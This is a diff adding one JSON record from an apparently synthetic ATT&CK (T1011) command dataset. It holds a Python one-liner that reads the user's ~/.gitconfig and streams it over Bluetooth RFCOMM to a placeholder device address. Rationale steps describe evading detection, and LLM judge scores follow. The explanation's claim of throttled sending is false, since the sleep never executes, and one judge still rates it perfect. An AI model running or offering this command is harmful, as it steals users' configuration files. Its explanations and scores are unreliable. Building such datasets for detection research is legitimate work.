@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os,time; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('33:44:55:66:77:88', 23)); p=os.path.expanduser('~/.gitconfig'); d=open(p,'rb').read(); [s.send(d[i:i+512]) or time.sleep(0.05) for i in range(0,len(d),512)]; s.close()\"",
+  "explanation": "Streams user git configuration over Bluetooth RFCOMM channel 23 in small chunks to blend with low-volume traffic on a non-IP medium per T1011.",
+  "rationale_steps": [
+    "Use Bluetooth RFCOMM to create an alternate exfil channel.",
+    "Select a nonstandard RFCOMM channel (23) to avoid defaults.",
+    "Chunk and send data to limit conspicuous burst patterns.",
+    "Close the socket to end the session cleanly."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-2550bc83",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid semicolon-separated statements, and correct socket API usage for RFCOMM.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly reads ~/.gitconfig and streams it in small chunks over a Bluetooth RFCOMM connection, but this maps to exfiltration over an alternative network medium rather than the provided T1011 physical medium description and also depends on a listening RFCOMM server and the file\u2019s existence.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T08:14:43.311507Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper quotes, valid syntax for socket operations, file reading, list comprehension, and has no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly implements exfiltration over a physical medium (Bluetooth) by reading the user's git configuration file and transmitting it in small chunks with timing delays to avoid detection, aligning perfectly with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:14:46.412237Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced syntax and valid constructs that will parse and execute without errors.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly establishes a Bluetooth RFCOMM connection and streams the target file in chunks, the critical 'to blend with low-volume traffic' intent is not semantically achieved, as the `time.sleep(0.05)` will never execute due to the `s.send()` method's truthy return value in the `or` expression, leading to a burst transfer rather than a throttled one.",
+        "combined_score": 4.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:15:08.731895Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
